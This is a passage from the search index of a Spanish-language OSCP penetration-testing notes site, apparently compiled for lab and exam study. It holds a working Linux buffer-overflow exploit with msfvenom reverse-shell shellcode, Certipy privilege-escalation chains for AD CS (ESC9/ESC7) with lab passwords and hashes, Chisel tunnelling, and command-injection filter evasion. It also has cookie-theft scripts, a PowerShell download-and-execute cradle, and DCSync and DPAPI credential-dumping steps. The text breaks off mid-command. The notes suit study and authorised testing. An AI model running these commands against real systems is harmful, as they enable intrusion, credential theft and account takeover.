Apoyo","text":""},{"location":"OSCP/bufferOverflowLinux/#bad-characters-caracteres-prohibidos","title":"Bad Characters (Caracteres Prohibidos)","text":""},{"location":"OSCP/bufferOverflowLinux/#concepto","title":"Concepto","text":"<p>Los bad characters son bytes que, por la forma en que la aplicaci\u00f3n procesa la entrada (por ejemplo, terminaci\u00f3n de cadenas, sanitizaci\u00f3n, etc.), se corrompen o modifican durante el env\u00edo. Esto impide que el payload se copie de forma \u00edntegra a la memoria.</p>"},{"location":"OSCP/bufferOverflowLinux/#generacion-de-la-lista-completa","title":"Generaci\u00f3n de la Lista Completa","text":"<p>Se define una variable con todos los bytes del <code>0x00</code> al <code>0xff</code>:</p> <pre><code>CHARS=\"$(printf '\\\\x%02x' {0..255})\"\n</code></pre> <p>Para contar el n\u00famero de bytes:</p> <pre><code>echo $CHARS | sed 's/\\\\x/ /g' | wc -w\n</code></pre>"},{"location":"OSCP/bufferOverflowLinux/#prueba-de-envio-y-deteccion","title":"Prueba de Env\u00edo y Detecci\u00f3n","text":"<p>Se env\u00eda el payload al programa vulnerable, incluyendo el bloque de caracteres:</p> <pre><code>(gdb) run $(python -c 'print \"\\x55\" * (1040 - 256 - 4) + \"&lt;CHARS&gt;\" + \"\\x66\" * 4')\n</code></pre> <p>Reemplazar <code>&lt;CHARS&gt;</code> por la secuencia completa.</p> <p>Luego, inspeccionamos la memoria para verificar el estado de la secuencia:</p> <pre><code>(gdb) x/2000xb $esp+500\n</code></pre>"},{"location":"OSCP/bufferOverflowLinux/#generando-shellcode","title":"Generando ShellCode","text":"<ul> <li>con msfvenom: <code>GNT@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=&lt;LHOST&gt; lport=&lt;LPORT&gt; --format c --arch x86 --platform linux --bad-chars \"&lt;chars&gt;\" --out &lt;filename&gt;</code></li> </ul> <p><pre><code>GNT@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars \"\\x00\\x09\\x0a\\x20\" --out shellcode\n\nFound 11 compatible encoders\nAttempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded with size 95 (iteration=0)\nx86/shikata_ga_nai chosen with final size 95\nPayload size: 95 bytes\nFinal size of c file: 425 bytes\nSaved as: shellcode\n\n\nGNT@htb[/htb]$ cat shellcode\n\nunsigned char buf[] = \n\"\\xda\\xca\\xba\\xe4\\x11\\xd4\\x5d\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1\"\n\"\\x12\\x31\\x50\\x17\\x03\\x50\\x17\\x83\\x24\\x15\\x36\\xa8\\x95\\xcd\\x41\"\n\"\\xb0\\x86\\xb2\\xfe\\x5d\\x2a\\xbc\\xe0\\x12\\x4c\\x73\\x62\\xc1\\xc9\\x3b\"\n</code></pre> - Explotando... : <code>gdb --args ./bow $(python -c 'print \"\\x55\" * (1040 - 124 - 95 - 4) + \"\\x90\" * 124 + \"\\xbe\\x97\\x4c\\xf2\\x9c\\xd9\\xf7\\xd9\\x74\\x24\\xf4\\x5f\\x33\\xc9\\xb1\\x12\\x83\\xc7\\x04\\x31\\x77\\x0e\\x03\\xe0\\x42\\x10\\x69\\x3f\\x80\\x23\\x71\\x6c\\x75\\x9f\\x1c\\x90\\xf0\\xfe\\x51\\xf2\\xcf\\x81\\x01\\xa3\\x7f\\xbe\\xe8\\xd3\\xc9\\xb8\\x0b\\xbb\\xb6\\x3a\\xec\\x3a\\x21\\x39\\xec\\x46\\xd8\\xb4\\x0d\\x06\\x7c\\x97\\x9c\\x35\\x32\\x14\\x96\\x58\\xf9\\x9b\\xfa\\xf2\\x6c\\xb3\\x89\\x6a\\x19\\xe4\\x42\\x08\\xb0\\x73\\x7f\\x9e\\x11\\x0d\\x61\\xae\\x9d\\xc0\\xe2\" + \"\\x66\" * 4')</code> - Llenamos el buffer con el caracter <code>\\x55</code>, U en ascii.     - Lo utilizamos para alcanzar el instruction pointer sin alterar la ejecuci\u00f3n. - El calculo es as\u00ed:     - Tama\u00f1o total del buffer: 1040 bytes.     - NOPs: 124 bytes.     - Shellcode: 95 bytes.     - Direcci\u00f3n EIP: 4 bytes.     - Espacio restante 1040-124-95-4=817 bytes - <code>\\x90</code> es el OP-code de la instrucci\u00f3n NOP en x86 assembly. - <code>\\x66</code> es el caracter que se sobreescribir\u00e1 en el EIP. - Entonces ahora si chequeamos los primeros bytes de nuestro shellcode matchean con los bytes luego de los bytes de NOPs.</p>"},{"location":"OSCP/caEnum/","title":"Certificate Authority &amp; Common Name Enumeration with Certipy","text":"<p>Certipy es una herramienta poderosa para interactuar con Active Directory Certificate Services (AD CS). Permite enumerar, solicitar y gestionar certificados, adem\u00e1s de identificar configuraciones vulnerables que pueden ser explotadas.</p> <ul> <li>ESC9 ATTACK</li> <li>Hacktricks ESC-X</li> </ul>"},{"location":"OSCP/caEnum/#instalacion","title":"Instalaci\u00f3n","text":"<ul> <li>Instalar con pipx:      <pre><code>pipx install certipy-ad\n</code></pre></li> </ul>"},{"location":"OSCP/caEnum/#uso-basico","title":"Uso B\u00e1sico","text":"<ul> <li>Enumerar configuraciones vulnerables:     <pre><code>certipy-ad find -u usuario@dominio.local -p contrase\u00f1a -dc-ip 192.168.1.100 -vulnerable\n</code></pre></li> </ul>"},{"location":"OSCP/caEnum/#comandos-principales","title":"Comandos Principales","text":"<p>Certipy ofrece una amplia gama de comandos para interactuar con AD CS. A continuaci\u00f3n, se presenta una tabla con los comandos m\u00e1s relevantes, sus descripciones, opciones clave y ejemplos pr\u00e1cticos:</p> Comando Descripci\u00f3n Opciones Clave y Ejemplos <code>find</code> Enumerar plantillas de certificados, CAs y configuraciones vulnerables. <code>-bloodhound</code>, <code>-enabled</code>, <code>-vulnerable</code>, <code>-dc-ip</code>. Ejemplo: <code>certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128 -vulnerable</code> <code>req</code> Solicitar, recuperar y renovar certificados. <code>-ca</code>, <code>-template</code>, <code>-upn</code>, <code>-dns</code>. Ejemplo: <code>certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User</code> <code>auth</code> Autenticar usando PKINIT Kerberos o Schannel con certificados. <code>-pfx</code>, <code>-no-save</code>, <code>-ptt</code>, <code>-dc-ip</code>. Ejemplo: <code>certipy-ad auth -pfx administrator.pfx -dc-ip 172.16.126.128</code> <code>shadow</code> Gestionar Credenciales Shadow para toma de control de cuentas. <code>-account</code>, <code>-device-id</code>, <code>auto</code>. Ejemplo: <code>certipy-ad shadow auto -username John@corp.local -p Passw0rd -account Jane</code> <code>forge</code> Crear Certificados Dorados usando una CA comprometida. <code>-ca-pfx</code>, <code>-upn</code>, <code>-dns</code>, <code>-template</code>. Ejemplo: <code>certipy-ad forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'</code> <code>cert</code> Trabajar con archivos PFX, descifrar y extraer certificados/claves. <code>-pfx</code>, <code>-password</code>, <code>-export</code>, <code>-nokey</code>. Ejemplo: <code>certipy-ad cert -pfx encrypted.pfx -password \"a387a1a1-5276-4488-9877-4e90da7567a4\" -export -out decrypted.pfx</code> <code>relay</code> Realizar relay NTLM a endpoints HTTP/RPC de AD CS para explotar vulnerabilidades. <code>-target</code>, <code>-ca</code>, <code>-template</code>. Ejemplo: <code>certipy-ad relay -target 'http://ca.corp.local'</code> <code>ca</code> Gestionar CA y certificados, incluyendo respaldos y adici\u00f3n de oficiales. <code>-backup</code>, <code>-add-officer</code>, <code>-enable-template</code>. Ejemplo: <code>certipy-ad ca -backup -ca 'corp-DC-CA' -username administrator@corp.local -hashes fc525c9683e8fe067095ba2ddc971889</code> <code>template</code> Gestionar plantillas de certificados, incluyendo cambios de configuraci\u00f3n. <code>-save-old</code>, <code>-configuration</code>. Ejemplo: <code>certipy-ad template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old</code>"},{"location":"OSCP/caEnum/#ejemplo-de-uso-esc9","title":"Ejemplo de Uso ESC9","text":"<p>A continuaci\u00f3n, se describe un ejemplo detallado para identificar y explotar una vulnerabilidad ESC9 utilizando Certipy:</p> <ol> <li> <p>Enumerar configuraciones vulnerables con hashes NTLM:     <pre><code>certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout\n</code></pre>     Este comando identificar\u00e1 posibles vulnerabilidades como <code>ESC9</code> o <code>ESC4</code>.</p> </li> <li> <p>Modificar el atributo <code>userPrincipalName</code>:     En el caso de <code>ESC9</code>, se puede reescribir el <code>userPrincipalName</code> de una cuenta comprometida para que coincida con el de <code>Administrator</code>:     <pre><code>certipy-ad account update -dc-ip 10.10.11.41 -u management_svc -hashes :$HASH -user ca_operator -upn Administrator\n</code></pre></p> </li> <li> <p>Solicitar un certificado con privilegios elevados:     Una vez modificado el <code>userPrincipalName</code>, se solicita un certificado para la cuenta comprometida:     <pre><code>certipy-ad req -u ca_operator -hashes :$HASH -ca certified-DC01-CA -template CertifiedAuthentication -upn Administrator -dc-ip 10.10.11.41 -debug\n</code></pre>     Esto generar\u00e1 un archivo <code>.pfx</code> para el usuario <code>Administrator</code>.</p> </li> <li> <p>Revertir el cambio en el <code>userPrincipalName</code>:     Es importante revertir el cambio para evitar conflictos al autenticar con el certificado generado:     <pre><code>certipy-ad account update -dc-ip 10.10.11.41 -u management_svc -hashes :$HASH -user ca_operator -upn ca_operator@certified.htb\n</code></pre></p> </li> <li> <p>Autenticar con el certificado generado:     Finalmente, se utiliza el archivo <code>.pfx</code> para autenticarse como <code>Administrator</code>:     <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb\n</code></pre>     Esto proporcionar\u00e1 un hash NTLM del usuario <code>Administrator</code>.</p> </li> </ol> <p>Este flujo permite explotar la vulnerabilidad ESC9 para obtener acceso privilegiado en el entorno AD CS.</p>"},{"location":"OSCP/caEnum/#explotacion-de-esc7-con-certipy-en-la-maquina-manager-htb","title":"Explotaci\u00f3n de ESC7 con Certipy en la m\u00e1quina Manager (HTB)","text":"<ul> <li>Fuente oficial - ESC7 en Certipy</li> </ul> <p>ESC7 es una vulnerabilidad que afecta a Active Directory Certificate Services (AD CS) cuando un usuario posee permisos peligrosos sobre una Autoridad Certificadora (CA). Si un usuario tiene permisos como <code>ManageCA</code> o <code>ManageCertificates</code>, puede abusar de esa configuraci\u00f3n para emitir certificados arbitrarios, incluyendo certificados para cuentas de alto privilegio, como <code>Administrator</code>.</p> <p>A continuaci\u00f3n, se detalla un ejemplo pr\u00e1ctico sobre c\u00f3mo explotar esta vulnerabilidad usando la herramienta <code>certipy</code>.</p>"},{"location":"OSCP/caEnum/#deteccion-de-esc7","title":"\ud83d\udd0e Detecci\u00f3n de ESC7","text":"<pre><code>certipy-ad find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout\n</code></pre> <p>Resultado relevante: <pre><code>[!] Vulnerabilities\n  ESC7 : 'MANAGER.HTB\\\\Raven' has dangerous permissions\n</code></pre></p> <p>Esto confirma que el usuario <code>Raven</code> tiene permisos como <code>ManageCA</code> sobre la CA <code>manager-DC01-CA</code>.</p>"},{"location":"OSCP/caEnum/#explotacion-de-esc7","title":"\u2705 Explotaci\u00f3n de ESC7","text":""},{"location":"OSCP/caEnum/#1-anadir-al-usuario-como-officer-de-la-ca","title":"1. A\u00f1adir al usuario como \"officer\" de la CA","text":"<p><pre><code>certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven \\\n  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'\n</code></pre> Esto otorga permisos de <code>ManageCertificates</code>, necesarios para aprobar solicitudes manualmente.</p>"},{"location":"OSCP/caEnum/#2-habilitar-plantilla-vulnerable-subca","title":"2. Habilitar plantilla vulnerable (SubCA)","text":"<pre><code>certipy-ad ca -ca 'manager-DC01-CA' -enable-template 'SubCA' \\\n  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'\n</code></pre>"},{"location":"OSCP/caEnum/#3-opcional-listar-plantillas-activas","title":"3. (Opcional) Listar plantillas activas","text":"<pre><code>certipy-ad ca -ca 'manager-DC01-CA' -list-templates \\\n  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'\n</code></pre>"},{"location":"OSCP/caEnum/#4-solicitar-un-certificado-como-administrator","title":"4. Solicitar un certificado como <code>administrator</code>","text":"<p><pre><code>certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \\\n  -ca 'manager-DC01-CA' -template 'SubCA' \\\n  -upn administrator@manager.htb -target manager.htb\n</code></pre> Esto falla con error <code>CERTSRV_E_TEMPLATE_DENIED</code>, pero genera un <code>Request ID</code> y guarda la clave privada.</p>"},{"location":"OSCP/caEnum/#5-volver-a-agregarse-como-officer-si-fue-revertido-por-el-entorno","title":"5. Volver a agregarse como officer (si fue revertido por el entorno)","text":"<pre><code>certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven \\\n  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'\n</code></pre>"},{"location":"OSCP/caEnum/#6-aprobar-manualmente-la-solicitud-usando-el-request-id-ej-19","title":"6. Aprobar manualmente la solicitud usando el Request ID (ej. 19)","text":"<pre><code>certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 \\\n  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'\n</code></pre>"},{"location":"OSCP/caEnum/#7-descargar-el-certificado-emitido","title":"7. Descargar el certificado emitido","text":"<p><pre><code>certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \\\n  -ca 'manager-DC01-CA' -retrieve 19\n</code></pre> Esto genera <code>administrator.pfx</code>, un archivo que contiene el certificado y la clave privada.</p>"},{"location":"OSCP/caEnum/#autenticacion-como-administrator","title":"\ud83d\udd11 Autenticaci\u00f3n como Administrator","text":""},{"location":"OSCP/caEnum/#1-obtener-tgt-usando-el-certificado","title":"1. Obtener TGT usando el certificado","text":"<pre><code>certipy-ad auth -pfx administrator.pfx\n</code></pre> <p>Si da error de \"Clock Skew\": <pre><code>sudo ntpdate -s manager.htb\n</code></pre></p> <p>Repetir: <pre><code>certipy-ad auth -pfx administrator.pfx\n</code></pre></p>"},{"location":"OSCP/caEnum/#2-acceder-a-la-maquina-con-evil-winrm-usando-el-hash-obtenido","title":"2. Acceder a la m\u00e1quina con Evil-WinRM usando el hash obtenido","text":"<pre><code>evil-winrm -i manager.htb -u administrator -H &lt;hash_obtenido&gt;\n</code></pre>"},{"location":"OSCP/chisel/","title":"Chisel for pivoting","text":"<ul> <li>Descargar Chisel</li> </ul>"},{"location":"OSCP/chisel/#chisel-en-maquina-victima","title":"Chisel en maquina victima:","text":"<ul> <li><code>./chisel server --socks5 --port 51234</code></li> </ul>"},{"location":"OSCP/chisel/#chisel-en-maquina-atacante-kali","title":"Chisel en maquina atacante kali","text":"<ul> <li><code>./chisel client victim-box-ip:51234 127.0.0.1:8001:127.0.0.1:8001 127.0.0.1:8443:127.0.01:8443</code><ul> <li>Con esto vemos esos puertos en nuestro local</li> </ul> </li> <li>Si no tambi\u00e9n as\u00ed: <code>./chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443</code></li> </ul>"},{"location":"OSCP/chisel/#chisel-con-socks","title":"Chisel con socks","text":""},{"location":"OSCP/chisel/#maquina-victima","title":"Maquina victima","text":"<ul> <li><code>./chisel server --socks5 --port 51234</code></li> </ul>"},{"location":"OSCP/chisel/#maquina-atacante-kali","title":"Maquina atacante kali","text":"<ul> <li><code>./chisel client target-box-ip:51234 50080:socks</code></li> </ul>"},{"location":"OSCP/chisel/#reverse-port-forwarding","title":"Reverse port forwarding","text":"<ul> <li>Ejecutar chisel server en maquina atacante en modo reverso</li> </ul>"},{"location":"OSCP/chisel/#chisel-en-maquina-atacante-kali_1","title":"Chisel en maquina atacante kali","text":"<ul> <li><code>./chisel server --reverse --port 51234</code></li> </ul>"},{"location":"OSCP/chisel/#chisel-en-maquina-victima_1","title":"Chisel en maquina victima","text":"<ul> <li><code>./chisel client attack-box-ip:51234 R:50080:socks</code></li> </ul>"},{"location":"OSCP/chisel/#se-puede-combinar-con-ligolo-revert-port-por-si-no-hay-acceso-ssh","title":"Se puede combinar con ligolo + revert port por si no hay acceso SSH","text":""},{"location":"OSCP/chisel/#ejemplo-de-uso-de-chisel-para-escuchar-un-puerto-que-el-firewall-no-permite","title":"Ejemplo de uso de chisel para escuchar un puerto que el firewall no permite","text":"<ul> <li>Caso hipotetico de que comprometimos un servidor que posee una base de datos pero no podemos acceder a ella porque el firewall no permite conexiones desde la red de la base de datos a la red de la victima.</li> <li>Hacemos un reverse port forwarding con chisel y escuchamos el puerto de la base de datos en la maquina atacante.</li> </ul>"},{"location":"OSCP/chisel/#maquina-atacante","title":"Maquina atacante:","text":"<ul> <li><code>./chisel server --port 445 --reverse</code></li> </ul>"},{"location":"OSCP/chisel/#maquina-victima_1","title":"Maquina victima:","text":"<ul> <li><code>.\\chisel.exe client 192.168.45.210:445 R:1433:127.0.0.1:1433</code><ul> <li><code>chisel client KALI_IP:PORT R:PORT:LOCALHOST:PORT</code><ul> <li>Si justo estamos usando el puerto 1433 en nuestro kali para otra cosa podemos usar otro puerto</li> <li><code>`.\\chisel.exe client 192.168.45.210:445 R:15432:127.0.0.1:1433</code></li> </ul> </li> </ul> </li> </ul>"},{"location":"OSCP/commandInjection/","title":"Command Injection","text":""},{"location":"OSCP/commandInjection/#operators","title":"Operators","text":"<ul> <li>AND: <code>&amp;&amp;</code></li> <li>OR: <code>||</code></li> <li>newline: <code>;</code> or <code>\\n</code></li> </ul>"},{"location":"OSCP/commandInjection/#injections","title":"Injections","text":"Tipo de Inyecci\u00f3n Operadores SQL Injection ' , ; -- / / Command Injection ; &amp;&amp; LDAP Injection * ( ) &amp; XPath Injection ' or and not substring concat count OS Command Injection ; &amp; Code Injection ' ; -- / / $() ${} #{} %{} ^ Directory Traversal/File Path Traversal ../ ..\\ %00 Object Injection ; &amp; XQuery Injection ' ; -- / / Shellcode Injection \\x \\u %u %n Header Injection \\n \\r\\n \\t %0d %0a %09"},{"location":"OSCP/commandInjection/#filter-evasions-for-command-injection","title":"Filter evasions for command injection","text":"<ul> <li>Bypass blacklisted operators: encodealo con URL encoding <code>%0a</code><ul> <li>Usar tabs: <code>%09</code></li> <li>Usar espacios: <code>%20</code></li> <li>Usar $IFS: estos son los Internal Field Separators de bash, por defecto son espacios, tabs y newlines. Se pueden cambiar con <code>IFS=</code> y luego se puede usar <code>$IFS</code> para separar comandos.</li> <li>Usar llaves <code>{}</code>: <code>{command}</code></li> <li>Podemos reemplazar los espacios con <code>${IFS}</code> y las barras <code>/</code> con <code>${PATH:0:1}</code> y el punto y coma con <code>${LS_COLORS:10:1}</code></li> </ul> </li> <li>Correr caracteres a la derecha: <code>echo $(tr '!-}' '\"-~'&lt;&lt;&lt;[)</code> esto nos da los caracteres ASCII que podemos usar.</li> <li>Poner comillas al comando: <code>w'h'o'am'i</code></li> <li>Comando reverseado:<ul> <li><code>echo 'whoami' | rev</code></li> <li>$(rev&lt;&lt;&lt;'imaohw')</li> </ul> </li> </ul>"},{"location":"OSCP/commandInjection/#base64-encoding-command-injection","title":"Base64 encoding command injection","text":"<ul> <li><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></li> <li><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></li> </ul>"},{"location":"OSCP/commandInjection/#tools","title":"Tools","text":"<ul> <li>Bashfuscator</li> <li>DOSfuscator</li> </ul>"},{"location":"OSCP/cookieExtraction/","title":"Cookie Extraction","text":""},{"location":"OSCP/cookieExtraction/#firefox","title":"Firefox","text":"<ul> <li>En windows: <code>copy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite .</code></li> <li>En ubuntu: <code>cp ~/.mozilla/firefox/*.default-release/cookies.sqlite .</code></li> <li>En mac os: <code>cp ~/Library/Application\\ Support/Firefox/Profiles/*.default-release/cookies.sqlite .</code></li> </ul> <pre><code>#!/usr/bin/env python3\n# Sample Script to extract cookies offile from FireFox sqlite database \n# Created by PlainText \n\nimport argparse\nimport sqlite3\n\ndef main(dbpath, host, cookie):\n    conn = sqlite3.connect(dbpath)\n    cursor = conn.cursor()\n\n    if (host == \"\" and cookie == \"\"):\n        query = \"SELECT * FROM moz_cookies\"\n    elif (host != \"\" and cookie == \"\"):\n        query = \"SELECT * FROM moz_cookies WHERE host LIKE '%{}%'\".format(host)\n    elif (host == \"\" and cookie != \"\"):\n        query = \"SELECT * FROM moz_cookies WHERE name LIKE '%{}%'\".format(cookie)\n    elif (host != \"\" and cookie != \"\"):\n        query = \"SELECT * FROM moz_cookies WHERE name LIKE '%{}%' AND host LIKE '%{}%'\".format(cookie, host)\n\n    cursor.execute(query)\n    records = cursor.fetchall()\n    rowCount = len(records) \n\n    if (rowCount &gt; 0):\n        for row in records:\n            print(row)\n    else:\n        print(\"[-] No cookie found with the selected options.\")\n\n    conn.close()\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--dbpath\", \"-d\", required=True, help=\"The path to the sqlite cookies database\")\n    parser.add_argument(\"--host\", \"-o\", required=False, help=\"The host for the cookie\", default=\"\")\n    parser.add_argument(\"--cookie\", \"-c\", required=False, help=\"The name of the cookie\", default=\"\")\n    args = parser.parse_args()\n    main(args.dbpath, args.host, args.cookie)\n</code></pre>"},{"location":"OSCP/cookieExtraction/#ejemplo-de-extraccion-de-cookies","title":"Ejemplo de extracci\u00f3n de cookies","text":"<ul> <li>Ejemplo con slack:<ul> <li><code>$ python3 cookieextractor.py --dbpath /home/kali/Desktop/htb/cookies.sqlite --host slack --cookie d</code></li> </ul> </li> <li>Ejemplo con facebook:<ul> <li><code>$ python3 cookieextractor.py --dbpath /home/kali/Desktop/htb/cookies.sqlite --host facebook --cookie c_user</code></li> </ul> </li> <li>Ejemplo con todas las cookies:<ul> <li><code>$ python3 cookieextractor.py --dbpath /home/kali/Desktop/htb/cookies.sqlite</code></li> </ul> </li> </ul>"},{"location":"OSCP/cookieExtraction/#chromium-based-browsers","title":"Chromium-based browsers","text":"<ul> <li>La diferencia entre firefox y chromium es que los valores de las cookies en chromium est\u00e1n encriptados.</li> <li>Para conseguir los valores podemos utilizar SharpChromium<ul> <li>SharpChromium</li> <li>Tambi\u00e9n existe una versi\u00f3n de powershell de este proyecto Invoke-SharpChromium</li> <li><code>IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')</code></li> <li><code>Invoke-SharpChromium -Command \"cookies slack.com\"</code></li> <li>otro ejemplo: <code>Invoke-SharpChromium -Command \"cookies facebook.com\"</code></li> </ul> </li> <li>Para compilar el proyecto se necesita visual studio IDE + .NET instalado, CTRL + SHIFT + B para compilar</li> <li>En la carpeta del proyecto /bin/Debug se encuentra el ejecutable.</li> </ul>"},{"location":"OSCP/dcsync/","title":"DC Sync Attack","text":""},{"location":"OSCP/dcsync/#explicacion-rapida","title":"Explicaci\u00f3n r\u00e1pida","text":"<ul> <li>Replica las credenciales de un dominio, el atacante pretende ser un DC pidiendole al otro DC \"hey, soy un DC02, dame tus hashes\".</li> <li>Ciertos usuarios como los DC tienen parmisos para replicar datos, entonces imita el comportamiento de otro DC para solicitar esta data.</li> <li>Entonces un atacante puede obtener hashes almacenados en el DC utilizando un usuario como krbgt o de cualquier usuario con privilegios altos.</li> </ul>"},{"location":"OSCP/dcsync/#mimikatz","title":"Mimikatz","text":"<ul> <li><code>privilege::debug</code></li> <li><code>lsadump::dcsync /domain:NOMBRE_DOMINIO /user:USUARIO</code></li> <li><code>lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\\administrator</code></li> </ul>"},{"location":"OSCP/dcsync/#secrets-dump","title":"Secrets Dump","text":"<ul> <li>La herramienta env\u00eda una solicitud al DC para replicar los objetos del dominio y as\u00ed extraer hashes.</li> <li><code>secretsdump.py &lt;dominio&gt;/&lt;usuario&gt;:&lt;contrase\u00f1a&gt;@&lt;IP_del_DC&gt;</code></li> <li><code>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5</code></li> </ul>"},{"location":"OSCP/dnsEnum/","title":"DNS Enumeration with dig","text":""},{"location":"OSCP/dnsEnum/#basic-dns-query","title":"Basic DNS Query","text":"<ul> <li><code>dig [domain] @&lt;DNS_Server&gt;</code><ul> <li><code>dig inlanefreight.htb @10.129.221.34</code></li> </ul> </li> </ul>"},{"location":"OSCP/dnsEnum/#zone-transfer","title":"Zone transfer","text":"<ul> <li><code>dig axfr [domain] @&lt;DNS_Server&gt;</code></li> </ul>"},{"location":"OSCP/dnsEnum/#reverse-dns-lookup","title":"Reverse DNS Lookup","text":"<ul> <li><code>dig -x &lt;IP_Address&gt;</code></li> </ul>"},{"location":"OSCP/dnsEnum/#enumerate-subdomains","title":"Enumerate subdomains","text":"<ul> <li><code>for sub in $(cat subdomains.txt); do dig $sub.inlanefreight.htb @10.129.221.34; done</code></li> </ul>"},{"location":"OSCP/dnsEnum/#check-dns-server-version-if-enabled","title":"Check DNS Server Version (if enabled)","text":"<ul> <li><code>dig CHAOS VERSION.BIND @&lt;DNS_Server&gt;</code></li> </ul>"},{"location":"OSCP/dnsEnum/#check-txt-records","title":"Check TXT Records","text":"<ul> <li><code>dig -t txt offseclab.io</code></li> </ul>"},{"location":"OSCP/dpapiAttack/","title":"DPAPI secrets Attack","text":""},{"location":"OSCP/dpapiAttack/#explicacion","title":"Explicaci\u00f3n","text":"<ul> <li>DPAPI es un mecanismo de cifrado de datos que se utiliza para proteger los datos del usuario en Windows.</li> <li>Aplicaciones como Chrome, Outlook, etc. utilizan DPAPI para proteger las contrase\u00f1as.</li> </ul>"},{"location":"OSCP/dpapiAttack/#que-se-necesita-para-hacer-este-ataque","title":"Que se necesita para hacer este ataque","text":"<ul> <li>El SID del usuario</li> <li>El masterkey del usuario</li> <li>La contrase\u00f1a del usuario</li> <li><code>C:\\users\\&lt;user&gt;\\appdata\\local\\microsoft\\credentials\\&lt;blob&gt;</code> (blob es un archivo binario que contiene la masterkey cifrada con la contrase\u00f1a del usuario)</li> <li><code>C:\\users\\&lt;user&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID&gt;\\</code> (contiene el masterkey cifrado con la contrase\u00f1a del usuario)</li> </ul>"},{"location":"OSCP/dpapiAttack/#pasos","title":"Pasos","text":"<ol> <li>Obtener el SID del usuario: <code>whoami /user</code> o <code>wmic useraccount get name,sid</code></li> <li>Obtener el masterkey cifrado con la contrase\u00f1a del usuario: <code>C:\\users\\&lt;user&gt;\\appdata\\local\\microsoft\\credentials\\&lt;blob&gt;</code></li> <li>Obtener el masterkey cifrado con la contrase\u00f1a del usuario: <code>C:\\users\\&lt;user&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID&gt;\\</code></li> <li>Mimikatz: <code>dpapi::cred /in:C:\\users\\&lt;user&gt;\\appdata\\local\\microsoft\\credentials\\&lt;credential blob&gt;</code></li> <li>Nos guardamos <code>guidMasterKey</code> y <code>pbData</code></li> <li>Revisar <code>c:\\users\\&lt;user&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID&gt;\\</code> para ver si hay un archivo con el mismo <code>guidMasterKey</code></li> <li>Si lo hay, usamos <code>mimikatz dpapi::masterkey /in:C:\\users\\&lt;user&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID&gt;\\&lt;guidMasterKey&gt; /password:&lt;password&gt;</code></li> <li><code>mimikatz dpapi::masterkey /in:C:\\users\\&lt;user&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID&gt;\\&lt;MasterKey blob&gt; /rpc</code></li> </ol>"},{"location":"OSCP/dpapiAttack/#otros-comandos","title":"Otros comandos","text":"<ul> <li><code>sekurlsa::dpapi</code> conseguimos las masterkeys cifradas con la contrase\u00f1a del usuario</li> <li>Ahora podemos hacer <code>dpapi::masterkey /in:C:\\users\\&lt;user&gt;\\appdata\\roaming\\microsoft\\protect\\&lt;SID&gt;\\&lt;guidMasterKey&gt; /password:&lt;password&gt;</code></li> <li><code>dpapi::chrome /in:\"C:\\Users\\kbell\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca 0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b</code></li> </ul>"},{"location":"OSCP/dpapiAttack/#ejemplo","title":"Ejemplo:","text":"<ul> <li><code>mimikatz sekurlsa::dpapi</code>: Obtenemos las masterkeys cifradas con la contrase\u00f1a del usuario</li> <li><code>sekurlsa::pth /user:epugh /domain:rastalabs.local /ntlm:326457b72c3f136d80d99bdbb935d109 /impersonateprocess</code>: Nos logeamos como el usuario que tiene la masterkey</li> <li><code>mimikatz dpapi::masterkey /in:C:\\Users\\epugh\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1396373213-2872852198-2033860859-1151\\7dc6a492-36e2-4c2d-be66-ba29d263dda2</code>: Obtenemos la masterkey cifrada con la contrase\u00f1a del usuario</li> <li><code>mimikatz dpapi::masterkey 